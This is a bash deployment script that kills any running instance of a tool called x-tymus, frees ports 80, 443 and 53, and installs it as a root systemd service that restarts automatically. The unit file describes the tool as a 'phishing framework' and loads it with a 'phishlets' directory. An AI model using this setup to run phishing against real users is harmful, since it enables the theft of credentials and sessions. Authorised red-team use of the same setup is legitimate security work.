#!/bin/bash
set -e

SERVICE_FILE=/etc/systemd/system/x-tymus.service
PROJECT_DIR=/root/project-x

echo "[*] Stopping service..."
systemctl stop x-tymus 2>/dev/null || true
systemctl disable x-tymus 2>/dev/null || true

echo "[*] Killing any remaining x-tymus processes..."
pkill -9 -x x-tymus 2>/dev/null || true
killall -9 x-tymus 2>/dev/null || true
sleep 1

echo "[*] Freeing ports..."
fuser -k 443/tcp 2>/dev/null || true
fuser -k 80/tcp 2>/dev/null || true
fuser -k 53/tcp 2>/dev/null || true
fuser -k 53/udp 2>/dev/null || true

echo "[*] Waiting for all x-tymus processes to die..."
for i in $(seq 1 15); do
    if ! pgrep -x x-tymus > /dev/null 2>&1; then
        echo "[*] All clear."
        break
    fi
    echo "    still running... ($i/15)"
    pkill -9 -x x-tymus 2>/dev/null || true
    sleep 1
done

if pgrep -x x-tymus > /dev/null 2>&1; then
    echo "[!] x-tymus still running — exit the interactive session first, then re-run this script."
    exit 1
fi

echo "[*] Writing service file to $SERVICE_FILE..."
cat > "$SERVICE_FILE" << 'EOF'
[Unit]
Description=x-tymus phishing framework
After=network.target
StartLimitIntervalSec=60
StartLimitBurst=5

[Service]
Type=simple
User=root
WorkingDirectory=/root/project-x
ExecStart=/root/project-x/build/x-tymus -p /root/project-x/phishlets -c /root/.x-tymus
Restart=always
RestartSec=5s
KillMode=control-group
KillSignal=SIGTERM
TimeoutStopSec=15
LimitNOFILE=65536
StandardOutput=append:/var/log/x-tymus.log
StandardError=append:/var/log/x-tymus.log

[Install]
WantedBy=multi-user.target
EOF

echo "[*] Reloading systemd..."
systemctl daemon-reload

echo "[*] Enabling and starting x-tymus service..."
systemctl enable x-tymus
systemctl start x-tymus

sleep 2
echo ""
systemctl status x-tymus --no-pager
